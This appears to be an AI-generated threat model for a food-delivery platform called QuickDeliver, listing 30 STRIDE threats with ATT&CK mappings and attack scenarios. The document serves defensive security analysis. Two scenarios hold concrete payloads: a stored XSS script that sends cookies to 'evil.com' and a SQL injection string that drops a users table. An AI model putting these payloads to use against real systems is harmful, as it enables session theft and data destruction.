# Stage 3: Threat Identification
**Target:** QuickDeliver | **Date:** 2025-12-03 | **Mode:** Automatic

## Threat Inventory

| ID | Threat Name | STRIDE | Component | ATT&CK | Kill Chain | Rating |
|----|-------------|--------|-----------|--------|------------|--------|
| T-001 | Credential Stuffing Attack | S | C-006 User Service | T1110.004 | Exploitation | HIGH |
| T-002 | OAuth Token Hijacking | S | C-006 User Service | T1528 | Exploitation | HIGH |
| T-003 | JWT Token Manipulation | S,E | C-005 API Gateway | T1134 | Exploitation | CRITICAL |
| T-004 | Session Fixation/Hijacking | S | C-014 Redis | T1539 | Exploitation | HIGH |
| T-005 | Phone Number Spoofing (OTP Bypass) | S | C-018 Twilio | T1111 | Exploitation | MEDIUM |
| T-006 | Order Price Manipulation | T | C-007 Order Service | T1565.001 | Actions | HIGH |
| T-007 | Driver GPS Location Spoofing | T | C-012 Tracking Service | T1565.002 | Actions | MEDIUM |
| T-008 | Payment Amount Tampering | T | C-010 Payment Service | T1565.001 | Actions | CRITICAL |
| T-009 | Menu Price Injection | T | C-009 Merchant Service | T1565.001 | Actions | MEDIUM |
| T-010 | Review/Rating Manipulation | T | C-013 PostgreSQL | T1565.001 | Actions | LOW |
| T-011 | Delivery Non-Receipt Disputes | R | C-007 Order Service | T1070 | Actions | MEDIUM |
| T-012 | Payment Chargeback Fraud | R | C-017 Stripe | T1070 | Actions | HIGH |
| T-013 | Driver Activity Log Tampering | R | C-008 Driver Service | T1070.003 | Actions | MEDIUM |
| T-014 | User PII Exposure via IDOR | I | C-006 User Service | T1530 | Collection | HIGH |
| T-015 | Driver Location Privacy Breach | I | C-012 Tracking Service | T1119 | Collection | MEDIUM |
| T-016 | Payment Token Leakage | I | C-010 Payment Service | T1552 | Collection | CRITICAL |
| T-017 | Merchant Sales Data Exposure | I | C-009 Merchant Service | T1530 | Collection | MEDIUM |
| T-018 | Admin API Mass Data Extraction | I | C-004 Admin Portal | T1213 | Exfiltration | CRITICAL |
| T-019 | Authentication Endpoint Brute Force | D | C-006 User Service | T1499.002 | Exploitation | HIGH |
| T-020 | WebSocket Connection Exhaustion | D | C-012 Tracking Service | T1499.001 | Impact | MEDIUM |
| T-021 | Order Processing Flood | D | C-007 Order Service | T1499 | Impact | MEDIUM |
| T-022 | Driver Assignment Queue Saturation | D | C-008 Driver Service | T1499.003 | Impact | LOW |
| T-023 | BOLA - Cross-User Data Access | E | C-006-009 Services | T1548 | Exploitation | HIGH |
| T-024 | Privilege Escalation to Admin | E | C-004 Admin Portal | T1068 | Privilege Escalation | CRITICAL |
| T-025 | Role Boundary Bypass | E | C-006 User Service | T1078.004 | Privilege Escalation | HIGH |
| T-026 | Stripe Webhook Spoofing | E | C-010 Payment Service | T1557 | Delivery | HIGH |
| T-027 | Checkr Webhook Forgery | E | C-008 Driver Service | T1557 | Delivery | MEDIUM |
| T-028 | Malicious File Upload (RCE) | E | C-015 S3 | T1190 | Installation | HIGH |
| T-029 | SQL Injection | T,I,E | C-013 PostgreSQL | T1190 | Exploitation | HIGH |
| T-030 | Stored XSS in User Content | T,I | C-003 Merchant Portal | T1059.007 | Exploitation | MEDIUM |

## Threat Details

### T-001: Credential Stuffing Attack
**STRIDE:** Spoofing | **Component:** C-006 User Service | **Type:** Generic

**Description:** Attackers use lists of compromised credentials from other breaches to attempt automated logins. Given QuickDeliver handles payment information and has financial value (earnings, promo codes), accounts are high-value targets. Success depends on password reuse by users and lack of rate limiting or anomaly detection.

**Attack Scenario:** External attacker uses automated tools with credential lists from dark web sources. They target `/auth/login` endpoint with high-volume requests from distributed IPs. Without proper rate limiting, thousands of credential pairs can be tested per minute.

**Mappings:**
- **ATT&CK:** Credential Access / T1110.004 - Credential Stuffing
- **Kill Chain:** Exploitation - Initial account compromise

**Impact:** C:H I:M A:L | **Rating:** HIGH | **Confidence:** H

---

### T-002: OAuth Token Hijacking
**STRIDE:** Spoofing | **Component:** C-006 User Service | **Type:** System-Specific

**Description:** OAuth flows via Google/Apple/Facebook can be compromised if tokens are intercepted or redirect URIs are manipulated. Mobile app deep linking adds attack surface. Attacker gaining OAuth token can impersonate user without password.

**Attack Scenario:** Attacker registers malicious app with similar bundle ID or exploits open redirect in callback handling. When victim initiates OAuth flow, token is redirected to attacker-controlled endpoint.

**Mappings:**
- **ATT&CK:** Credential Access / T1528 - Steal Application Access Token
- **Kill Chain:** Exploitation - Authentication bypass

**Impact:** C:H I:M A:N | **Rating:** HIGH | **Confidence:** M

---

### T-003: JWT Token Manipulation
**STRIDE:** Spoofing, Elevation of Privilege | **Component:** C-005 API Gateway | **Type:** Generic

**Description:** If JWT secret is weak, leaked, or algorithm confusion is possible (none/alg switching), attackers can forge tokens with arbitrary claims including elevated roles. JWT tokens control all API access per documentation.

**Attack Scenario:** Attacker captures valid JWT, attempts algorithm confusion (RS256→HS256) or brute forces weak secrets. Modified token with `"role":"admin"` grants full platform access.

**Mappings:**
- **ATT&CK:** Privilege Escalation / T1134 - Access Token Manipulation
- **Kill Chain:** Exploitation - Full system compromise possible

**Impact:** C:H I:H A:H | **Rating:** CRITICAL | **Confidence:** M

---

### T-004: Session Fixation/Hijacking
**STRIDE:** Spoofing | **Component:** C-014 Redis | **Type:** Generic

**Description:** Session tokens stored in Redis can be stolen via XSS, network interception, or cache poisoning. 15-minute token expiry with 7-day refresh tokens means compromise of refresh token grants extended access.

**Attack Scenario:** Attacker exploits XSS vulnerability to exfiltrate refresh token from local storage, or performs man-in-the-middle on insecure network to capture tokens in transit.

**Mappings:**
- **ATT&CK:** Credential Access / T1539 - Steal Web Session Cookie
- **Kill Chain:** Exploitation - Account takeover

**Impact:** C:H I:M A:L | **Rating:** HIGH | **Confidence:** M

---

### T-005: Phone Number Spoofing (OTP Bypass)
**STRIDE:** Spoofing | **Component:** C-018 Twilio | **Type:** System-Specific

**Description:** SMS-based verification is vulnerable to SIM swapping, SS7 attacks, and VoIP number spoofing. Attackers who compromise phone verification can bypass 2FA or take over accounts during password reset.

**Attack Scenario:** Attacker social engineers phone carrier for SIM swap, intercepts SMS OTP codes sent via Twilio, completes password reset or account verification.

**Mappings:**
- **ATT&CK:** Credential Access / T1111 - Two-Factor Authentication Interception
- **Kill Chain:** Exploitation - Authentication bypass

**Impact:** C:H I:M A:N | **Rating:** MEDIUM | **Confidence:** L

---

### T-006: Order Price Manipulation
**STRIDE:** Tampering | **Component:** C-007 Order Service | **Type:** System-Specific

**Description:** If client-submitted order totals are trusted without server-side recalculation, attackers can submit orders with manipulated prices. Cart modifications, promo code stacking, or race conditions could enable free/discounted orders.

**Attack Scenario:** Attacker intercepts POST `/orders` request, modifies `subtotal` or `total` fields to reduced amounts while keeping valid payment token. If backend trusts client values, order processes at manipulated price.

**Mappings:**
- **ATT&CK:** Impact / T1565.001 - Stored Data Manipulation
- **Kill Chain:** Actions on Objectives - Financial fraud

**Impact:** C:L I:H A:L | **Rating:** HIGH | **Confidence:** M

---

### T-007: Driver GPS Location Spoofing
**STRIDE:** Tampering | **Component:** C-012 Tracking Service | **Type:** System-Specific

**Description:** Drivers can use GPS spoofing apps to fake their location, enabling fraud scenarios: appearing closer to restaurants for priority assignment, collecting delivery fee without actually delivering, or manipulating distance-based earnings.

**Attack Scenario:** Driver installs GPS spoofing app on device, sets fake coordinates near high-demand areas. System assigns orders based on spoofed proximity. Driver may collect earnings for phantom deliveries.

**Mappings:**
- **ATT&CK:** Impact / T1565.002 - Transmitted Data Manipulation
- **Kill Chain:** Actions on Objectives - Operational fraud

**Impact:** C:L I:M A:L | **Rating:** MEDIUM | **Confidence:** M

---

### T-008: Payment Amount Tampering
**STRIDE:** Tampering | **Component:** C-010 Payment Service | **Type:** System-Specific

**Description:** If payment intents are created with client-supplied amounts or if race conditions exist between order creation and payment capture, attackers can manipulate the amount charged. This directly impacts platform revenue and merchant payouts.

**Attack Scenario:** Attacker exploits TOCTOU (time-of-check-to-time-of-use) vulnerability by modifying order after Stripe payment intent creation but before capture, or manipulates amount parameter in instant payout requests.

**Mappings:**
- **ATT&CK:** Impact / T1565.001 - Stored Data Manipulation
- **Kill Chain:** Actions on Objectives - Direct financial theft

**Impact:** C:L I:H A:M | **Rating:** CRITICAL | **Confidence:** M

---

### T-009: Menu Price Injection
**STRIDE:** Tampering | **Component:** C-009 Merchant Service | **Type:** System-Specific

**Description:** Merchants can manipulate menu prices after orders are placed or during CSV import. Negative prices, extreme values, or race conditions could enable over-charging customers or under-paying platform fees.

**Attack Scenario:** Malicious merchant uploads CSV with script injection in price fields or exploits race condition to change prices between cart addition and order submission, causing customer overcharge.

**Mappings:**
- **ATT&CK:** Impact / T1565.001 - Stored Data Manipulation
- **Kill Chain:** Actions on Objectives - Price manipulation fraud

**Impact:** C:L I:M A:L | **Rating:** MEDIUM | **Confidence:** M

---

### T-010: Review/Rating Manipulation
**STRIDE:** Tampering | **Component:** C-013 PostgreSQL | **Type:** System-Specific

**Description:** Fake reviews or rating manipulation can artificially boost or damage merchant/driver reputations. Could involve creating fake accounts, coordinated rating attacks, or exploiting lack of rate limiting on review endpoints.

**Attack Scenario:** Competitor creates multiple customer accounts, places minimal orders, then submits 1-star reviews to damage target merchant ratings. Or merchant pays for fake 5-star reviews.

**Mappings:**
- **ATT&CK:** Impact / T1565.001 - Stored Data Manipulation
- **Kill Chain:** Actions on Objectives - Reputation manipulation

**Impact:** C:N I:M A:L | **Rating:** LOW | **Confidence:** M

---

### T-011: Delivery Non-Receipt Disputes
**STRIDE:** Repudiation | **Component:** C-007 Order Service | **Type:** System-Specific

**Description:** Customers can claim non-delivery to get refunds while actually receiving orders. Without adequate proof (photos, signatures, GPS confirmation), platform cannot prove delivery occurred.

**Attack Scenario:** Customer places order, receives delivery, then reports "never delivered" through `/orders/{id}/issue` endpoint. Without mandatory delivery photos or signature verification, refund is issued to customer while driver/platform absorbs loss.

**Mappings:**
- **ATT&CK:** Defense Evasion / T1070 - Indicator Removal
- **Kill Chain:** Actions on Objectives - Refund fraud

**Impact:** C:N I:M A:L | **Rating:** MEDIUM | **Confidence:** M

---

### T-012: Payment Chargeback Fraud
**STRIDE:** Repudiation | **Component:** C-017 Stripe | **Type:** Generic

**Description:** Customers can dispute legitimate charges with their bank after receiving orders, forcing chargeback. Platform loses order value plus chargeback fees. Pattern of fraudulent chargebacks possible without velocity checks.

**Attack Scenario:** Fraudster uses stolen credit card for orders, or legitimate customer disputes charges claiming unauthorized transaction after delivery. Stripe processes chargeback; platform has limited recourse.

**Mappings:**
- **ATT&CK:** Defense Evasion / T1070 - Indicator Removal
- **Kill Chain:** Actions on Objectives - Financial fraud

**Impact:** C:L I:M A:M | **Rating:** HIGH | **Confidence:** H

---

### T-013: Driver Activity Log Tampering
**STRIDE:** Repudiation | **Component:** C-008 Driver Service | **Type:** System-Specific

**Description:** If audit logs are stored in same database without integrity protection, drivers or internal actors could modify activity records to hide fraudulent behavior or manipulate earnings records.

**Attack Scenario:** Compromised driver account or malicious insider modifies delivery timestamps, acceptance rates, or earnings records to inflate performance metrics or justify higher payouts.

**Mappings:**
- **ATT&CK:** Defense Evasion / T1070.003 - Clear Command History
- **Kill Chain:** Actions on Objectives - Evidence tampering

**Impact:** C:L I:M A:L | **Rating:** MEDIUM | **Confidence:** L

---

### T-014: User PII Exposure via IDOR
**STRIDE:** Information Disclosure | **Component:** C-006 User Service | **Type:** Generic

**Description:** Insecure Direct Object References in user endpoints allow accessing other users' data by manipulating IDs. Endpoints like `/users/me/addresses`, `/users/me/payment-methods` could leak if ID validation fails.

**Attack Scenario:** Attacker modifies user ID in API request from their ID to victim's ID. If authorization only checks authentication (not ownership), attacker retrieves victim's addresses, phone, and payment method details.

**Mappings:**
- **ATT&CK:** Collection / T1530 - Data from Cloud Storage Object
- **Kill Chain:** Collection - PII harvesting

**Impact:** C:H I:L A:N | **Rating:** HIGH | **Confidence:** M

---

### T-015: Driver Location Privacy Breach
**STRIDE:** Information Disclosure | **Component:** C-012 Tracking Service | **Type:** System-Specific

**Description:** Real-time driver location broadcast could expose driver movements beyond assigned delivery. If WebSocket authorization is weak, anyone could track driver locations. GPS history could reveal driver home addresses.

**Attack Scenario:** Attacker establishes WebSocket connection with stolen/forged token, subscribes to driver location updates. Tracks driver patterns to identify home location or stalk specific drivers.

**Mappings:**
- **ATT&CK:** Collection / T1119 - Automated Collection
- **Kill Chain:** Collection - Location surveillance

**Impact:** C:M I:N A:N | **Rating:** MEDIUM | **Confidence:** M

---

### T-016: Payment Token Leakage
**STRIDE:** Information Disclosure | **Component:** C-010 Payment Service | **Type:** System-Specific

**Description:** Stripe payment method IDs, while not full card numbers, could be leaked through verbose error messages, API responses, or logs. Combined with other data, could enable unauthorized charges.

**Attack Scenario:** API error response includes full Stripe payment_method_id in stack trace. Attacker with Stripe platform access could use leaked tokens for unauthorized charges through connected accounts.

**Mappings:**
- **ATT&CK:** Credential Access / T1552 - Unsecured Credentials
- **Kill Chain:** Collection - Payment data theft

**Impact:** C:H I:L A:N | **Rating:** CRITICAL | **Confidence:** M

---

### T-017: Merchant Sales Data Exposure
**STRIDE:** Information Disclosure | **Component:** C-009 Merchant Service | **Type:** System-Specific

**Description:** Analytics endpoints (`/merchants/me/analytics/sales`) could leak sensitive business data if authorization is bypassable. Competitors could access sales volumes, popular items, and revenue data.

**Attack Scenario:** Attacker exploits IDOR or parameter tampering on analytics endpoint to access competitor merchant's sales data, gaining unfair business intelligence advantage.

**Mappings:**
- **ATT&CK:** Collection / T1530 - Data from Cloud Storage Object
- **Kill Chain:** Collection - Business intelligence theft

**Impact:** C:M I:N A:N | **Rating:** MEDIUM | **Confidence:** M

---

### T-018: Admin API Mass Data Extraction
**STRIDE:** Information Disclosure | **Component:** C-004 Admin Portal | **Type:** System-Specific

**Description:** Compromised admin account has access to all users, orders, and financial data via `/admin/*` endpoints. No documented rate limiting or data export controls could enable mass PII extraction.

**Attack Scenario:** Attacker compromises admin credentials via phishing or credential reuse. Uses admin search endpoints to enumerate and export all user records, addresses, phone numbers, and partial payment data.

**Mappings:**
- **ATT&CK:** Collection / T1213 - Data from Information Repositories
- **Kill Chain:** Exfiltration - Mass data breach

**Impact:** C:H I:L A:L | **Rating:** CRITICAL | **Confidence:** M

---

### T-019: Authentication Endpoint Brute Force
**STRIDE:** Denial of Service | **Component:** C-006 User Service | **Type:** Generic

**Description:** Without rate limiting on `/auth/login`, `/auth/forgot-password`, and related endpoints, attackers can flood authentication systems, causing service degradation or enabling credential attacks.

**Attack Scenario:** Attacker launches distributed brute force attack against login endpoint. High volume locks out legitimate users, overwhelms database queries, and potentially exhausts Twilio SMS credits.

**Mappings:**
- **ATT&CK:** Impact / T1499.002 - Service Exhaustion Flood
- **Kill Chain:** Exploitation - Service disruption

**Impact:** C:N I:N A:H | **Rating:** HIGH | **Confidence:** M

---

### T-020: WebSocket Connection Exhaustion
**STRIDE:** Denial of Service | **Component:** C-012 Tracking Service | **Type:** System-Specific

**Description:** Real-time tracking via WebSocket (`wss://ws.quickdeliver.com`) could be targeted with connection exhaustion attacks. Each active delivery requires persistent connections for customer and driver.

**Attack Scenario:** Attacker opens thousands of WebSocket connections with valid or stolen tokens, exhausting server connection limits. Legitimate customers lose real-time tracking during peak hours.

**Mappings:**
- **ATT&CK:** Impact / T1499.001 - OS Exhaustion Flood
- **Kill Chain:** Impact - Service degradation

**Impact:** C:N I:N A:M | **Rating:** MEDIUM | **Confidence:** M

---

### T-021: Order Processing Flood
**STRIDE:** Denial of Service | **Component:** C-007 Order Service | **Type:** System-Specific

**Description:** Mass order submission could overwhelm order processing, payment authorization, and driver assignment systems. Attackers could use stolen payment methods for volume attacks.

**Attack Scenario:** Attacker with multiple accounts or stolen credentials submits hundreds of orders simultaneously. Even if payments fail, the processing overhead overwhelms merchant notification systems and driver assignment queues.

**Mappings:**
- **ATT&CK:** Impact / T1499 - Endpoint Denial of Service
- **Kill Chain:** Impact - Operational disruption

**Impact:** C:N I:L A:M | **Rating:** MEDIUM | **Confidence:** M

---

### T-022: Driver Assignment Queue Saturation
**STRIDE:** Denial of Service | **Component:** C-008 Driver Service | **Type:** System-Specific

**Description:** Driver assignment algorithm could be manipulated by rapid accept/decline cycles or by flooding available driver pools with offline/online toggles.

**Attack Scenario:** Compromised driver accounts rapidly toggle online/offline status, accept then immediately decline orders, causing assignment algorithm to fail and orders to remain unassigned.

**Mappings:**
- **ATT&CK:** Impact / T1499.003 - Application Exhaustion Flood
- **Kill Chain:** Impact - Operational disruption

**Impact:** C:N I:L A:L | **Rating:** LOW | **Confidence:** L

---

### T-023: BOLA - Cross-User Data Access
**STRIDE:** Elevation of Privilege | **Component:** C-006-009 Services | **Type:** Generic

**Description:** Broken Object Level Authorization (BOLA) in REST endpoints allows accessing other users' resources by modifying object IDs. Common in APIs with predictable/sequential IDs.

**Attack Scenario:** Customer changes order ID in `/orders/{id}` from their order to another customer's order. If endpoint only validates authentication without ownership check, attacker accesses/modifies other orders.

**Mappings:**
- **ATT&CK:** Privilege Escalation / T1548 - Abuse Elevation Control Mechanism
- **Kill Chain:** Exploitation - Unauthorized access

**Impact:** C:H I:H A:L | **Rating:** HIGH | **Confidence:** M

---

### T-024: Privilege Escalation to Admin
**STRIDE:** Elevation of Privilege | **Component:** C-004 Admin Portal | **Type:** System-Specific

**Description:** Weak admin role assignment, JWT claim modification, or API authorization flaws could allow regular users to access admin functionality. Admin can suspend users, issue refunds, and access all data.

**Attack Scenario:** Attacker identifies admin endpoint patterns, exploits missing role check on specific admin function, or modifies JWT role claim if signature is weak/predictable.

**Mappings:**
- **ATT&CK:** Privilege Escalation / T1068 - Exploitation for Privilege Escalation
- **Kill Chain:** Privilege Escalation - Full platform control

**Impact:** C:H I:H A:H | **Rating:** CRITICAL | **Confidence:** M

---

### T-025: Role Boundary Bypass
**STRIDE:** Elevation of Privilege | **Component:** C-006 User Service | **Type:** System-Specific

**Description:** Customer accessing driver endpoints, driver accessing merchant endpoints, or any cross-role access. Single user table with role field (customer/driver/merchant/admin) requires strict role enforcement.

**Attack Scenario:** Customer learns driver API endpoint patterns from documentation, attempts to access `/drivers/earnings` or `/drivers/orders/available`. If role check is missing, customer gains driver functionality.

**Mappings:**
- **ATT&CK:** Initial Access / T1078.004 - Cloud Accounts
- **Kill Chain:** Privilege Escalation - Role violation

**Impact:** C:M I:H A:L | **Rating:** HIGH | **Confidence:** M

---

### T-026: Stripe Webhook Spoofing
**STRIDE:** Elevation of Privilege | **Component:** C-010 Payment Service | **Type:** System-Specific

**Description:** If Stripe webhook signature validation is missing or bypassed, attackers can send fake payment confirmations, triggering order fulfillment without actual payment or issuing unauthorized refunds.

**Attack Scenario:** Attacker discovers webhook endpoint from API documentation, crafts fake `payment_intent.succeeded` webhook with valid-looking payload. If signature isn't verified, order processes without payment.

**Mappings:**
- **ATT&CK:** Initial Access / T1557 - Adversary-in-the-Middle
- **Kill Chain:** Delivery - Fraudulent transaction injection

**Impact:** C:L I:H A:M | **Rating:** HIGH | **Confidence:** M

---

### T-027: Checkr Webhook Forgery
**STRIDE:** Elevation of Privilege | **Component:** C-008 Driver Service | **Type:** System-Specific

**Description:** Fake Checkr background check webhooks could approve drivers who should be rejected, allowing individuals with disqualifying records onto the platform.

**Attack Scenario:** Attacker learns Checkr webhook format, sends fake "clear" result for their driver application, bypassing background check. Gets approved to access driver platform with fraudulent clearance.

**Mappings:**
- **ATT&CK:** Initial Access / T1557 - Adversary-in-the-Middle
- **Kill Chain:** Delivery - Verification bypass

**Impact:** C:L I:M A:L | **Rating:** MEDIUM | **Confidence:** M

---

### T-028: Malicious File Upload (RCE)
**STRIDE:** Elevation of Privilege | **Component:** C-015 S3 | **Type:** Generic

**Description:** Driver document uploads and menu images could be exploited to upload malicious files. If S3 serves content directly with executable MIME types, or if files are processed unsafely, RCE is possible.

**Attack Scenario:** Attacker uploads image with embedded PHP code as "driver_license.jpg", exploiting lack of content-type validation. If S3 or backend processes file without sanitization, code executes.

**Mappings:**
- **ATT&CK:** Initial Access / T1190 - Exploit Public-Facing Application
- **Kill Chain:** Installation - Backdoor establishment

**Impact:** C:H I:H A:H | **Rating:** HIGH | **Confidence:** M

---

### T-029: SQL Injection
**STRIDE:** Tampering, Information Disclosure, Elevation of Privilege | **Component:** C-013 PostgreSQL | **Type:** Generic

**Description:** User input fields (search, promo codes, menu import CSV) could be vulnerable to SQL injection if not properly parameterized. Node.js with PostgreSQL requires careful query construction.

**Attack Scenario:** Attacker enters malicious SQL in merchant search field: `'; DROP TABLE users; --`. If string concatenation is used instead of parameterized queries, attacker can read/modify/delete database records.

**Mappings:**
- **ATT&CK:** Initial Access / T1190 - Exploit Public-Facing Application
- **Kill Chain:** Exploitation - Database compromise

**Impact:** C:H I:H A:H | **Rating:** HIGH | **Confidence:** M

---

### T-030: Stored XSS in User Content
**STRIDE:** Tampering, Information Disclosure | **Component:** C-003 Merchant Portal | **Type:** Generic

**Description:** Merchant names, menu descriptions, or review comments could contain XSS payloads that execute in other users' browsers, stealing session tokens or performing actions on their behalf.

**Attack Scenario:** Merchant sets business name to `<script>fetch('evil.com?c='+document.cookie)</script>`. When admin views merchant in portal or customer browses menu, script executes and exfiltrates their session.

**Mappings:**
- **ATT&CK:** Execution / T1059.007 - JavaScript
- **Kill Chain:** Exploitation - Session theft, lateral movement

**Impact:** C:H I:M A:L | **Rating:** MEDIUM | **Confidence:** M

---

**Total Threats:** 30 | **By STRIDE:** S:5 T:5 R:3 I:5 D:4 E:8
**Confidence:** HIGH - Threats derived from documented architecture with standard web/mobile security patterns applied.

---

## Report Generation Details

> **⚠️ AI-Generated Content Disclaimer**
> 
> This report was generated using the [AI Threat Modeling Framework](https://github.com/ensingm2/AI-threat-modeling-rulesets). AI-generated security analysis should be reviewed by qualified security professionals before use. No guarantees of accuracy or completeness are provided. This report is intended as a starting point for security analysis, not a definitive security assessment.

| Field | Value |
|-------|-------|
| **Generated** | 2025-12-03 |
| **Framework Version** | 1ea9259 |
| **Model** | Claude Opus 4 |
